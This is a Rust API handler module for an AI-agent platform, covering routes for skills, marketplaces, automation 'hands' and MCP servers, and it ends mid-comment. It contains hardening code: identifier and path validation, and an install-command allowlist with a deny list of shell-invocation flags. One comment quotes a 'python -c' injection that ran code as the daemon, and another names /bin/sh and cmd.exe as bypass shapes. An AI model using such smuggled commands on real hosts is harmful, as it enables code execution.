//! Skills, marketplace, ClawHub, hands, and extension handlers.

pub(crate) use super::agents;
pub(crate) use super::resolve_lang;
// `super::channels::FieldType` import removed alongside
// the channel-config write helpers that consumed it.
use super::config::json_to_toml_value;
use super::AppState;
use super::RequestLanguage;
use crate::mcp_oauth::KernelOAuthProvider;
use crate::types::*;
use axum::extract::{Path, Query, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::Json;
use librefang_types::i18n::ErrorTranslator;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;

mod clawhub;
mod extensions;
mod hands;
mod mcp;
mod skill;
mod skillhub;

pub use clawhub::*;
pub use extensions::*;
pub use hands::*;
pub use mcp::*;
pub use skill::*;
pub use skillhub::*;

/// Build routes for the skills/marketplace/hands/MCP/integrations/extensions domain.
pub fn router() -> axum::Router<std::sync::Arc<super::AppState>> {
    axum::Router::new()
        // Skills
        .route("/skills", axum::routing::get(list_skills))
        .route("/skills/registry", axum::routing::get(list_skill_registry))
        .route("/skills/install", axum::routing::post(install_skill))
        .route("/skills/uninstall", axum::routing::post(uninstall_skill))
        .route("/skills/reload", axum::routing::post(reload_skills))
        .route("/skills/create", axum::routing::post(create_skill))
        .route("/skills/{name}", axum::routing::get(get_skill_detail))
        .route(
            "/skills/{name}/evolve/update",
            axum::routing::post(evolve_update_skill),
        )
        .route(
            "/skills/{name}/evolve/patch",
            axum::routing::post(evolve_patch_skill),
        )
        .route(
            "/skills/{name}/evolve/rollback",
            axum::routing::post(evolve_rollback_skill),
        )
        .route(
            "/skills/{name}/evolve/delete",
            axum::routing::post(evolve_delete_skill),
        )
        .route(
            "/skills/{name}/evolve/file",
            axum::routing::post(evolve_write_file).delete(evolve_remove_file),
        )
        .route("/skills/{name}/file", axum::routing::get(get_supporting_file))
        .route(
            "/skills/{name}/propose",
            axum::routing::post(propose_skill_to_registry),
        )
        // Skill workshop (#3328) — passive after-turn capture review.
        .route(
            "/skills/pending",
            axum::routing::get(list_pending_candidates),
        )
        .route(
            "/skills/pending/{id}",
            axum::routing::get(show_pending_candidate),
        )
        .route(
            "/skills/pending/{id}/approve",
            axum::routing::post(approve_pending_candidate),
        )
        .route(
            "/skills/pending/{id}/reject",
            axum::routing::post(reject_pending_candidate),
        )
        .route(
            "/skills/pending/{id}/propose-to-registry",
            axum::routing::post(propose_pending_to_registry),
        )
        // Marketplace / ClawHub
        .route(
            "/marketplace/search",
            axum::routing::get(marketplace_search),
        )
        .route("/clawhub/search", axum::routing::get(clawhub_search))
        .route("/clawhub/browse", axum::routing::get(clawhub_browse))
        .route(
            "/clawhub/skill/{slug}",
            axum::routing::get(clawhub_skill_detail),
        )
        .route(
            "/clawhub/skill/{slug}/code",
            axum::routing::get(clawhub_skill_code),
        )
        .route("/clawhub/install", axum::routing::post(clawhub_install))
        // ClawHub China mirror (mirror-cn.clawhub.com)
        .route("/clawhub-cn/search", axum::routing::get(clawhub_cn_search))
        .route("/clawhub-cn/browse", axum::routing::get(clawhub_cn_browse))
        .route(
            "/clawhub-cn/skill/{slug}",
            axum::routing::get(clawhub_cn_skill_detail),
        )
        .route(
            "/clawhub-cn/skill/{slug}/code",
            axum::routing::get(clawhub_cn_skill_code),
        )
        .route(
            "/clawhub-cn/install",
            axum::routing::post(clawhub_cn_install),
        )
        // Skillhub marketplace
        .route(
            "/skillhub/search",
            axum::routing::get(skillhub_search),
        )
        .route(
            "/skillhub/browse",
            axum::routing::get(skillhub_browse),
        )
        .route(
            "/skillhub/skill/{slug}",
            axum::routing::get(skillhub_skill_detail),
        )
        .route(
            "/skillhub/skill/{slug}/code",
            axum::routing::get(skillhub_skill_code),
        )
        .route(
            "/skillhub/install",
            axum::routing::post(skillhub_install),
        )
        // Hands (browser automation engine)
        .route("/hands", axum::routing::get(list_hands))
        .route("/hands/install", axum::routing::post(install_hand))
        .route(
            "/hands/marketplace/install",
            axum::routing::post(install_hand_from_marketplace),
        )
        .route("/hands/{hand_id}", axum::routing::delete(uninstall_hand))
        .route("/hands/active", axum::routing::get(list_active_hands))
        .route("/hands/{hand_id}", axum::routing::get(get_hand))
        .route(
            "/hands/{hand_id}/manifest",
            axum::routing::get(get_hand_manifest),
        )
        .route(
            "/hands/{hand_id}/activate",
            axum::routing::post(activate_hand),
        )
        .route(
            "/hands/{hand_id}/check-deps",
            axum::routing::post(check_hand_deps),
        )
        .route(
            "/hands/{hand_id}/install-deps",
            axum::routing::post(install_hand_deps),
        )
        .route(
            "/hands/{hand_id}/secret",
            axum::routing::post(set_hand_secret),
        )
        .route(
            "/hands/{hand_id}/settings",
            axum::routing::get(get_hand_settings).put(update_hand_settings),
        )
        .route(
            "/hands/instances/{id}/pause",
            axum::routing::post(pause_hand),
        )
        .route(
            "/hands/instances/{id}/resume",
            axum::routing::post(resume_hand),
        )
        .route(
            "/hands/instances/{id}",
            axum::routing::delete(deactivate_hand),
        )
        .route(
            "/hands/instances/{id}/stats",
            axum::routing::get(hand_stats),
        )
        .route(
            "/hands/instances/{id}/browser",
            axum::routing::get(hand_instance_browser),
        )
        .route(
            "/hands/instances/{id}/message",
            axum::routing::post(hand_send_message),
        )
        .route(
            "/hands/instances/{id}/session",
            axum::routing::get(hand_get_session),
        )
        .route(
            "/hands/instances/{id}/status",
            axum::routing::get(hand_instance_status),
        )
        .route("/hands/reload", axum::routing::post(reload_hands))
        // Unified MCP server management — every MCP server lives as an
        // [[mcp_servers]] entry in config.toml, with an optional template_id
        // recording which catalog entry (if any) it was installed from.
        .route(
            "/mcp/servers",
            axum::routing::get(list_mcp_servers).post(add_mcp_server),
        )
        .route(
            "/mcp/servers/{name}",
            axum::routing::get(get_mcp_server)
                .put(update_mcp_server)
                .delete(delete_mcp_server),
        )
        .route(
            "/mcp/servers/{name}/reconnect",
            axum::routing::post(reconnect_mcp_server_handler),
        )
        .route(
            "/mcp/servers/{name}/taint",
            axum::routing::patch(patch_mcp_server_taint),
        )
        // MCP OAuth auth endpoints (existing, unchanged)
        .route(
            "/mcp/servers/{name}/auth/status",
            axum::routing::get(super::mcp_auth::auth_status),
        )
        .route(
            "/mcp/servers/{name}/auth/start",
            axum::routing::post(super::mcp_auth::auth_start),
        )
        .route(
            "/mcp/servers/{name}/auth/callback",
            axum::routing::get(super::mcp_auth::auth_callback),
        )
        .route(
            "/mcp/servers/{name}/auth/revoke",
            axum::routing::delete(super::mcp_auth::auth_revoke),
        )
        // Read-only catalog of installable MCP server templates
        .route("/mcp/catalog", axum::routing::get(list_mcp_catalog))
        .route(
            "/mcp/catalog/{id}",
            axum::routing::get(get_mcp_catalog_entry),
        )
        // Health + reload (covers all configured servers)
        .route("/mcp/health", axum::routing::get(mcp_health_handler))
        .route("/mcp/reload", axum::routing::post(reload_mcp_handler))
        // Read-only registry of named `[[taint_rules]]` for dashboard
        // validation (issue #3050 follow-up — typo'd rule_set names
        // would otherwise be silent no-ops in scanner).
        .route("/mcp/taint-rules", axum::routing::get(list_mcp_taint_rules))
        // Extensions — kept as dashboard-friendly aliases over the unified store.
        .route("/extensions", axum::routing::get(list_extensions))
        .route(
            "/extensions/install",
            axum::routing::post(install_extension),
        )
        .route(
            "/extensions/uninstall",
            axum::routing::post(uninstall_extension),
        )
        .route("/extensions/{name}", axum::routing::get(get_extension))
}

// ---------------------------------------------------------------------------
// Skills endpoints
// ---------------------------------------------------------------------------
/// Query parameters for `GET /api/skills`. Combines the existing
/// `?category=` filter with the canonical `?offset=&limit=` pagination
/// from `PaginationQuery` (#3639). Server caps `limit` at
/// `PAGINATION_MAX_LIMIT` (= 100).
#[derive(Debug, Default, serde::Deserialize)]
pub struct ListSkillsQuery {
    pub category: Option<String>,
    pub offset: Option<usize>,
    pub limit: Option<usize>,
}

// ─── Skill workshop pending review (#3328) ──────────────────────────
#[derive(Debug, serde::Deserialize, utoipa::IntoParams)]
pub struct PendingListQuery {
    /// Optional agent UUID filter. When set, only candidates from that
    /// agent are returned. Omit for a workspace-wide list.
    #[serde(default)]
    pub agent: Option<String>,
}

/// Path-traversal hardening for `install_skill` (audit:
/// skill-install-path-traversal). Used on both `req.name` (joined
/// onto `registry/skills/`) and `req.hand` (joined onto
/// `workspaces/hands/`).
///
/// Contract:
/// - non-empty, ≤ 64 chars (caps log noise and matches the project
///   pattern from `agent_templates.rs::validate_template_name`)
/// - characters limited to `[A-Za-z0-9_-]` — the strictest project
///   convention; cannot contain `..`, `/`, `\`, or any platform
///   path separator
/// - first character must be alphanumeric — rejects `-foo` and
///   `_foo` (option-arg / dotfile-style ambiguity) and `.foo`
///   (leading-dot dotfile)
///
/// `field` is "name" or "hand" — used to scope the rejection
/// message so the client knows which input was bad.
fn validate_skill_identifier(value: &str, field: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > 64 {
        return Err(format!(
            "invalid skill {field}: must be 1-64 characters, got {} chars",
            value.len()
        ));
    }
    let all_safe = value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
    if !all_safe {
        return Err(format!(
            "invalid skill {field}: only [A-Za-z0-9_-] allowed (no path separators, dots, or other punctuation)"
        ));
    }
    // First-char-alphanumeric rule (rejects leading `-` / `_` /
    // `.`). `.empty()` is impossible here — we just bounded above.
    let first = value.chars().next().expect("non-empty checked above");
    if !first.is_ascii_alphanumeric() {
        return Err(format!(
            "invalid skill {field}: must start with an alphanumeric character"
        ));
    }
    Ok(())
}

/// Parse YAML frontmatter from a SKILL.md file. Returns `(name, description)`.
/// Parsed YAML frontmatter from a SKILL.md.
///
/// Only `name` and `description` were ever required by the LibreFang
/// registry; `version` / `author` / `tags` are optional add-ons that
/// the dashboard's federated catalog UI surfaces when present. Missing
/// fields parse to `None` / `[]` rather than failing — old SKILL.md
/// files that pre-date the schema extension keep working.
#[derive(Debug, Default)]
struct SkillMdFrontmatter {
    name: String,
    description: String,
    version: Option<String>,
    author: Option<String>,
    tags: Vec<String>,
}

fn strip_yaml_value(raw: &str) -> String {
    // YAML scalar values can be wrapped in single or double quotes; strip
    // either form and trim whitespace.
    let trimmed = raw.trim();
    let unquoted = trimmed
        .strip_prefix('"')
        .and_then(|s| s.strip_suffix('"'))
        .or_else(|| {
            trimmed
                .strip_prefix('\'')
                .and_then(|s| s.strip_suffix('\''))
        })
        .unwrap_or(trimmed);
    unquoted.to_string()
}

fn parse_yaml_inline_list(raw: &str) -> Vec<String> {
    // Accept the two shapes that show up in the wild:
    //   tags: ["a", "b"]
    //   tags: [a, b]
    // Anything else (block-list `- item` form, multi-line) is left for
    // a future iteration; SKILL.md frontmatters in the registry only
    // ever use the inline form today.
    let trimmed = raw.trim();
    let inner = trimmed
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .unwrap_or(trimmed);
    inner
        .split(',')
        .map(strip_yaml_value)
        .filter(|s| !s.is_empty())
        .collect()
}

fn parse_skill_md_frontmatter(content: &str) -> Option<SkillMdFrontmatter> {
    let trimmed = content.trim();
    if !trimmed.starts_with("---") {
        return None;
    }
    let after_open = &trimmed[3..];
    let close = after_open.find("---")?;
    let frontmatter = &after_open[..close];
    let mut fm = SkillMdFrontmatter::default();
    for line in frontmatter.lines() {
        let line = line.trim();
        if let Some(val) = line.strip_prefix("name:") {
            fm.name = strip_yaml_value(val);
        } else if let Some(val) = line.strip_prefix("description:") {
            fm.description = strip_yaml_value(val);
        } else if let Some(val) = line.strip_prefix("version:") {
            let v = strip_yaml_value(val);
            if !v.is_empty() {
                fm.version = Some(v);
            }
        } else if let Some(val) = line.strip_prefix("author:") {
            let a = strip_yaml_value(val);
            if !a.is_empty() {
                fm.author = Some(a);
            }
        } else if let Some(val) = line.strip_prefix("tags:") {
            fm.tags = parse_yaml_inline_list(val);
        }
    }
    if fm.name.is_empty() && fm.description.is_empty() {
        return None;
    }
    Some(fm)
}

// ---------------------------------------------------------------------------
// ClawHub China mirror endpoints (mirror-cn.clawhub.com)
// ---------------------------------------------------------------------------
const CLAWHUB_CN_BASE_URL: &str = "https://mirror-cn.clawhub.com/api/v1";

/// Check whether a SkillError represents a ClawHub rate-limit (429).
fn is_clawhub_rate_limit(err: &librefang_skills::SkillError) -> bool {
    matches!(err, librefang_skills::SkillError::RateLimited(_))
}

/// Convert a browse entry (nested stats/tags) to a flat JSON object for the frontend.
fn clawhub_browse_entry_to_json(
    entry: &librefang_skills::clawhub::ClawHubBrowseEntry,
) -> serde_json::Value {
    let version = librefang_skills::clawhub::ClawHubClient::entry_version(entry);
    serde_json::json!({
        "slug": entry.slug,
        "name": entry.display_name,
        "description": entry.summary,
        "version": version,
        "downloads": entry.stats.downloads,
        "stars": entry.stats.stars,
        "updated_at": entry.updated_at,
    })
}

// ---------------------------------------------------------------------------
// Hands endpoints
// ---------------------------------------------------------------------------
/// Detect the server platform for install command selection.
fn server_platform() -> &'static str {
    if cfg!(target_os = "macos") {
        "macos"
    } else if cfg!(target_os = "windows") {
        "windows"
    } else {
        "linux"
    }
}

/// Package managers `install_hand_deps` is allowed to invoke.
///
/// Audit (`docs/issues/install-deps-rce-admin.md`): the historical
/// metacharacter-only blocklist (`;|&$\`><(){}\n\r`) is bypassed when an
/// Admin authors `install_deps = ["python", "-c", "import os; …"]` in a
/// HAND.toml — the punctuation lands inside the quoted `-c` argument and
/// `Command::new("python")` runs the interpreter under the daemon UID.
/// Locking `parts[0]` to known package-manager binaries collapses that
/// pathway: a language runtime / generic shell cannot be named here at
/// all, so the `-c` payload has no executor.
const INSTALL_DEPS_ALLOWED_PROGRAMS: &[&str] = &[
    "apt", "apt-get", "dnf", "pacman", "brew", "winget", "pip", "pip3", "npm", "cargo",
];

/// Argument flags that turn an otherwise-safe binary into a generic
/// code-execution sink. `pip`, `npm`, etc. legitimately never need these,
/// so a bare match is sufficient — we also catch the `=value` long-form
/// variants for the long flags. Compared case-insensitively against
/// each `args` entry.
const INSTALL_DEPS_DENIED_ARG_FLAGS: &[&str] =
    &["-c", "-e", "--exec", "--shell", "--eval", "--command"];

/// Long-flag prefixes (`--name=value`) that are equivalent to the
/// denied bare flags above and must also be rejected.
const INSTALL_DEPS_DENIED_ARG_PREFIXES: &[&str] = &["--exec=", "--shell=", "--eval=", "--command="];

/// Validate the program + args extracted from a HAND.toml install command
/// against the allowlist (program) and denylist (args). Returns the human
/// reason on rejection so the per-dep result message stays informative;
/// returns `Ok(())` on success.
///
/// Pure helper — no I/O, no globals — so the rejection rules can be
/// exercised by `cargo test -p librefang-api` without booting a hand
/// instance. The handler still loops over per-dep validation; this
/// function only adjudicates one (program, args) tuple.
fn validate_install_deps_argv(program: &str, args: &[&str]) -> Result<(), String> {
    // Absolute paths defeat the allowlist: a HAND could name `/bin/sh`
    // (Unix) or `\\?\C:\Windows\System32\cmd.exe` (Windows) and the
    // allowlist would never match. Reject both shapes up front.
    if program.starts_with('/') || program.contains('\\') {
        return Err(format!(
            "Install command program '{program}' uses an absolute path; \
             only bare package-manager binary names are allowed"
        ));
    }
    if !INSTALL_DEPS_ALLOWED_PROGRAMS.contains(&program) {
        return Err(format!(
            "Install command program '{program}' is not in install-deps allowlist ({})",
            INSTALL_DEPS_ALLOWED_PROGRAMS.join(", ")
        ));
    }
    if let Some(flag) = args.iter().find(|a| {
        let lower = a.to_ascii_lowercase();
        INSTALL_DEPS_DENIED_ARG_FLAGS.iter().any(|f| lower == *f)
            || INSTALL_DEPS_DENIED_ARG_PREFIXES
                .iter()
                .any(|p| lower.starts_with(p))
    }) {
        return Err(format!(
            "Install command contains disallowed flag '{flag}' \
             (shell-invocation flags are blocked)"
        ));
    }
    Ok(())
}

/// Render a `HandInstance` to the canonical JSON shape used by every
/// hand-instance mutation handler (activate / pause / resume).
///
/// Keeps activate, pause, and resume byte-identical so dashboard clients
/// can `setQueryData` directly from any of them. Bug #3832 — mutation
/// handlers must return the post-mutation entity, not an ack envelope.
fn hand_instance_to_json(instance: &librefang_hands::HandInstance) -> serde_json::Value {
    serde_json::json!({
        "instance_id": instance.instance_id,
        "hand_id": instance.hand_id,
        "status": format!("{}", instance.status),
        "agent_id": instance.agent_id().map(|a: librefang_types::agent::AgentId| a.to_string()),
        "agent_name": instance.agent_name(),
        "activated_at": instance.activated_at.to_rfc3339(),
    })
}

/// Inner handler — produces a `(StatusCode, Vec<u8>)` snapshot suitable
/// for caching by the Idempotency-Key middleware.
async fn activate_hand_inner(
    state: Arc<AppState>,
    hand_id: String,
    body_bytes: &[u8],
) -> (StatusCode, Vec<u8>) {
    let config = if body_bytes.is_empty() {
        std::collections::HashMap::new()
    } else {
        match serde_json::from_slice::<librefang_hands::ActivateHandRequest>(body_bytes) {
            Ok(req) => req.config,
            Err(_) => std::collections::HashMap::new(),
        }
    };

    match state.kernel.activate_hand(&hand_id, config) {
        Ok(instance) => {
            // If the hand agent has a non-reactive schedule (autonomous hands),
            // start its background loop so it begins running immediately.
            if let Some(agent_id) = instance.agent_id() {
                let entry = state
                    .kernel
                    .agent_registry()
                    .list()
                    .into_iter()
                    .find(|e| e.id == agent_id);
                if let Some(entry) = entry {
                    if !matches!(
                        entry.manifest.schedule,
                        librefang_types::agent::ScheduleMode::Reactive
                    ) {
                        state.kernel.clone().start_background_for_agent(
                            agent_id,
                            &entry.name,
                            &entry.manifest.schedule,
                        );
                    }
                }
            }
            let body = serde_json::to_vec(&hand_instance_to_json(&instance))
                .unwrap_or_else(|_| b"{}".to_vec());
            (StatusCode::OK, body)
        }
        Err(e) => {
            let payload = serde_json::json!({"error": format!("{e}"), "code": "activate_hand_failed", "type": "activate_hand_failed"});
            (
                StatusCode::BAD_REQUEST,
                serde_json::to_vec(&payload).unwrap_or_default(),
            )
        }
    }
}

// ---------------------------------------------------------------------------
// Hand instance proxy endpoints — users interact with hands, not raw agents
// ---------------------------------------------------------------------------
/// Helper: resolve a hand instance UUID → its linked AgentId.
/// Returns an error response tuple if the instance is missing or has no agent.
fn resolve_hand_agent(
    state: &AppState,
    instance_id: uuid::Uuid,
) -> Result<
    (
        librefang_hands::HandInstance,
        librefang_types::agent::AgentId,
    ),
    (StatusCode, Json<serde_json::Value>),
> {
    let instance = state
        .kernel
        .hands()
        .get_instance(instance_id)
        .ok_or_else(|| ApiErrorResponse::not_found("Hand instance not found").into_json_tuple())?;
    let agent_id = instance.agent_id().ok_or_else(|| {
        (
            StatusCode::OK,
            Json(serde_json::json!({"error": "Hand instance is not active", "active": false})),
        )
    })?;
    Ok((instance, agent_id))
}

// ---------------------------------------------------------------------------
// MCP server endpoints
// ---------------------------------------------------------------------------
fn http_compat_header_summary(
    header: &librefang_types::config::HttpCompatHeaderConfig,
) -> serde_json::Value {
    serde_json::json!({
        "name": header.name,
        "value_env": header.value_env,
        "source": if header.value_env.is_some() {
            "env"
        } else if header.value.is_some() {
            "static"
        } else {
            "unset"
        },
    })
}

fn http_compat_tool_summary(
    tool: &librefang_types::config::HttpCompatToolConfig,
) -> serde_json::Value {
    serde_json::json!({
        "name": tool.name,
        "description": tool.description,
        "path": tool.path,
        "method": serde_json::to_value(&tool.method).unwrap_or(serde_json::json!("post")),
        "request_mode": serde_json::to_value(&tool.request_mode)
            .unwrap_or(serde_json::json!("json_body")),
        "response_mode": serde_json::to_value(&tool.response_mode)
            .unwrap_or(serde_json::json!("json")),
    })
}

fn serialize_mcp_transport(
    transport: &librefang_types::config::McpTransportEntry,
) -> serde_json::Value {
    match transport {
        librefang_types::config::McpTransportEntry::Stdio { command, args } => {
            serde_json::json!({
                "type": "stdio",
                "command": command,
                "args": args,
            })
        }
        librefang_types::config::McpTransportEntry::Sse { url } => {
            serde_json::json!({
                "type": "sse",
                "url": url,
            })
        }
        librefang_types::config::McpTransportEntry::Http { url } => {
            serde_json::json!({
                "type": "http",
                "url": url,
            })
        }
        librefang_types::config::McpTransportEntry::HttpCompat {
            base_url,
            headers,
            tools,
        } => {
            let tool_summaries: Vec<serde_json::Value> =
                tools.iter().map(http_compat_tool_summary).collect();
            let header_summaries: Vec<serde_json::Value> =
                headers.iter().map(http_compat_header_summary).collect();
            serde_json::json!({
                "type": "http_compat",
                "base_url": base_url,
                "headers": header_summaries,
                "tools_count": tool_summaries.len(),
                "tools": tool_summaries,
            })
        }
    }
}

/// PATCH /api/mcp/servers/{name}/taint — Partial update of taint settings.
///
/// Accepts a body of `{ "taint_scanning"?: bool, "taint_policy"?: McpTaintPolicy }`
/// and merges it into the existing entry. Unlike PUT this does NOT require
/// the caller to round-trip every other server field (transport, env, etc.) —
/// the dashboard taint editor in particular needs only these two fields and
/// shouldn't risk silently dropping unrelated fields it doesn't render.
// `McpTaintPolicy` (in `librefang-types`) doesn't carry `utoipa::ToSchema`,
// so deriving `ToSchema` here would fail. The OpenAPI annotation uses
// `serde_json::Value` for the body schema, which keeps the spec accurate
// without forcing a downstream derive.
#[derive(serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct PatchMcpTaintRequest {
    /// When supplied, replaces `taint_scanning` on the existing entry.
    #[serde(default)]
    pub taint_scanning: Option<bool>,
    /// When supplied, replaces `taint_policy` on the existing entry.
    /// Pass `{}` (empty object) to clear all per-tool policies; pass `null`
    /// (or omit) to leave existing policies untouched.
    #[serde(default)]
    pub taint_policy: Option<librefang_types::config::McpTaintPolicy>,
}

/// Upsert an MCP server entry in config.toml's `[[mcp_servers]]` array.
///
/// If an entry with the same name already exists it is replaced; otherwise a
/// new entry is appended.
fn upsert_mcp_server_config(
    config_path: &std::path::Path,
    entry: &librefang_types::config::McpServerConfigEntry,
) -> Result<(), String> {
    validate_static_file_path(config_path, "config.toml")?;
    let mut table: toml::value::Table = if config_path.exists() {
        let content = std::fs::read_to_string(config_path).map_err(|e| e.to_string())?;
        // Propagate parse errors instead of silently defaulting to an empty
        // table, which would overwrite every unrelated section when we write
        // back. A malformed config.toml should surface to the caller.
        toml::from_str(&content).map_err(|e| format!("config.toml is not valid TOML: {e}"))?
    } else {
        toml::value::Table::new()
    };

    // Serialize the entry to a TOML value via JSON round-trip
    let entry_json = serde_json::to_value(entry).map_err(|e| e.to_string())?;
    let entry_toml = json_to_toml_value(&entry_json);

    let servers = table
        .entry("mcp_servers".to_string())
        .or_insert_with(|| toml::Value::Array(Vec::new()));

    if let toml::Value::Array(ref mut arr) = servers {
        // Remove existing entry with same name (if any)
        arr.retain(|v| {
            v.as_table()
                .and_then(|t| t.get("name"))
                .and_then(|n| n.as_str())
                .map(|n| n != entry.name)
                .unwrap_or(true)
        });
        // Append new/updated entry
        arr.push(entry_toml);
    }

    let toml_string = toml::to_string_pretty(&table).map_err(|e| e.to_string())?;
    std::fs::write(config_path, toml_string).map_err(|e| e.to_string())?;
    Ok(())
}

/// Remove an MCP server entry from config.toml's `[[mcp_servers]]` array by name.
fn remove_mcp_server_config(config_path: &std::path::Path, name: &str) -> Result<(), String> {
    validate_static_file_path(config_path, "config.toml")?;
    let mut table: toml::value::Table = if config_path.exists() {
        let content = std::fs::read_to_string(config_path).map_err(|e| e.to_string())?;
        // Propagate parse errors instead of silently defaulting to an empty
        // table, which would destroy every unrelated section when we write
        // back after the retain().
        toml::from_str(&content).map_err(|e| format!("config.toml is not valid TOML: {e}"))?
    } else {
        return Ok(());
    };

    if let Some(toml::Value::Array(ref mut arr)) = table.get_mut("mcp_servers") {
        arr.retain(|v| {
            v.as_table()
                .and_then(|t| t.get("name"))
                .and_then(|n| n.as_str())
                .map(|n| n != name)
                .unwrap_or(true)
        });
    }

    let toml_string = toml::to_string_pretty(&table).map_err(|e| e.to_string())?;
    std::fs::write(config_path, toml_string).map_err(|e| e.to_string())?;
    Ok(())
}

fn validate_static_file_path(
    path: &std::path::Path,
    expected_file_name: &str,
) -> Result<(), String> {
    let actual = path.file_name().and_then(|name| name.to_str());
    if actual != Some(expected_file_name) {
        return Err(format!(
            "invalid file path '{}': expected file '{}'",
            path.display(),
            expected_file_name
        ));
    }
    // Block path-traversal components (`..`). We intentionally do NOT reject
    // `Component::Prefix` — on Windows every absolute path contains a drive-
    // letter prefix (e.g. `C:`), and the paths passed here are constructed
    // server-side via `home_dir().join(file)`, so the prefix is legitimate.
    if path
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err(format!("unsafe path '{}'", path.display()));
    }
    Ok(())
}

/// Resolve a GitHub token for registry operations: prefer the process
/// env (`GITHUB_TOKEN`, set by the dashboard GitHub OAuth flow and by
/// operators), then fall back to the vault. Returns `None` when neither
/// holds a non-empty token.
fn resolve_github_token(state: &Arc<AppState>) -> Option<String> {
    if let Ok(tok) = std::env::var("GITHUB_TOKEN") {
        if !tok.trim().is_empty() {
            return Some(tok);
        }
    }
    state
        .kernel
        .vault_get("GITHUB_TOKEN")
        .filter(|t| !t.trim().is_empty())
}

// ── Skill evolution handlers ───────────────────────────────────────────
//
// Each handler looks the skill up by name, clones the InstalledSkill
// snapshot so we don't hold the RwLock across the await, delegates to
// the evolution module, then reloads the registry so the change is
// immediately visible on subsequent requests.
fn clone_installed_skill(
    state: &Arc<AppState>,
    name: &str,
) -> Result<librefang_skills::InstalledSkill, (StatusCode, Json<serde_json::Value>)> {
    // Try the live registry first. Fall back to disk for skills that
    // exist on the filesystem but haven't been hot-reloaded into the
    // in-memory registry yet — e.g. after a just-completed
    // `skill_evolve_create` from within the same dashboard session.
    {
        let registry = state
            .kernel
            .skill_registry_ref()
            .read()
            .unwrap_or_else(|e| e.into_inner());
        if let Some(s) = registry.get(name) {
            return Ok(s.clone());
        }
    }
    let skills_dir = state.kernel.home_dir().join("skills");
    librefang_skills::evolution::load_installed_skill_from_disk(&skills_dir, name).map_err(|e| {
        match e {
            librefang_skills::SkillError::NotFound(_) => {
                ApiErrorResponse::not_found(format!("Skill '{name}' not found")).into_json_tuple()
            }
            other => {
                ApiErrorResponse::bad_request(format!("Skill '{name}': {other}")).into_json_tuple()
            }
        }
    })
}

/// Reject dashboard/CLI evolve calls when the kernel is in Stable mode
/// (registry frozen). Mirrors the agent-tool gate in `tool_runner.rs`
/// — evolution writes to disk directly, so the frozen check on its
/// own only stops the in-memory reload. Without this guard the
/// dashboard would happily mutate skills that the operator pinned via
/// Stable mode.
fn reject_if_frozen(state: &Arc<AppState>) -> Option<(StatusCode, Json<serde_json::Value>)> {
    let registry = state
        .kernel
        .skill_registry_ref()
        .read()
        .unwrap_or_else(|e| e.into_inner());
    if registry.is_frozen() {
        Some(
            ApiErrorResponse::bad_request(
                "Skill evolution is disabled in Stable mode (registry frozen)",
            )
            .into_json_tuple(),
        )
    } else {
        None
    }
}

fn evolution_err_to_response(
    e: librefang_skills::SkillError,
) -> (StatusCode, Json<serde_json::Value>) {
    use librefang_skills::SkillError as E;
    let msg = e.to_string();
    match e {
        E::NotFound(_) => ApiErrorResponse::not_found(msg).into_json_tuple(),
        E::AlreadyInstalled(_) => ApiErrorResponse::conflict(msg).into_json_tuple(),
        E::InvalidManifest(_) | E::SecurityBlocked(_) | E::YamlParse(_) | E::TomlParse(_) => {
            ApiErrorResponse::bad_request(msg).into_json_tuple()
        }
        // 4xx arms above echo the actionable SkillError; the catch-all
        // 500 scrubs (audit: rusqlite-errors-leak) — `internal_scrub`
        // logs `msg` and returns the generic body.
        _ => ApiErrorResponse::internal_scrub(msg).into_json_tuple(),
    }
}

fn evolution_ok_response(
    result: librefang_skills::evolution::EvolutionResult,
) -> (StatusCode, Json<serde_json::Value>) {
    // Serialize the whole struct so dashboard consumers pick up the
    // full set of EvolutionResult fields automatically
    // (match_strategy, match_count, evolution_count, mutation_count,
    // use_count) instead of relying on this handler being updated
    // every time a new field is added.
    (
        StatusCode::OK,
        Json(serde_json::to_value(result).unwrap_or(serde_json::json!({}))),
    )
}

/// Record a successful skill evolution in the audit trail. All
/// dashboard-initiated mutations go through this so the audit log has a
/// tamper-evident record of every `/api/skills/.../evolve/*` action.
fn audit_evolve(state: &Arc<AppState>, action: &str, skill_name: &str, detail: &str) {
    state.kernel.audit().record(
        // Dashboard calls don't have an agent_id — use a distinctive
        // actor so audit readers can tell user actions from agent ones.
        "dashboard".to_string(),
        librefang_kernel::audit::AuditAction::AgentMessage,
        format!("skill_evolve:{action}:{skill_name}"),
        detail.to_string(),
    );
}

// ── Helper functions for secrets.env management ────────────────────────
/// Escape a value for safe storage in a `.env` file.
///
/// If a value contains literal newlines the raw `KEY=value\nEXTRA=junk` text
/// would be parsed as two separate keys by every dotenv reader. Backslashes
/// must be doubled so they are not misread as escape sequences on read-back.
fn escape_env_value(value: &str) -> String {
    value
        .replace('\\', "\\\\") // must come first to avoid double-escaping
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}

pub(crate) fn write_secret_env(
    path: &std::path::Path,
    key: &str,
    value: &str,
) -> Result<(), std::io::Error> {
    validate_static_file_path(path, "secrets.env")
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidInput, e))?;
    if key.contains('\n') || key.contains('\r') {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "secret key must not contain newline characters",
        ));
    }
    if value.contains('\n') || value.contains('\r') {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "secret value must not contain newline characters",
        ));
    }
    let mut lines: Vec<String> = if path.exists() {
        std::fs::read_to_string(path)?
            .lines()
            .map(|l| l.to_string())
            .collect()
    } else {
        Vec::new()
    };

    // Remove existing line for this key
    lines.retain(|l| !l.starts_with(&format!("{key}=")));

    // Add new line — escape the value so embedded newlines/backslashes cannot
    // corrupt the file structure.
    let escaped = escape_env_value(value);
    lines.push(format!("{key}={escaped}"));

    // Ensure parent directory exists
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }

    // Atomic mode-0600 write (audit: write-secret-env-toctou).
    //
    // Pre-fix the path was `fs::write` (opens at the process umask,
    // typically `0644`) followed by `chmod 0600`. Between the
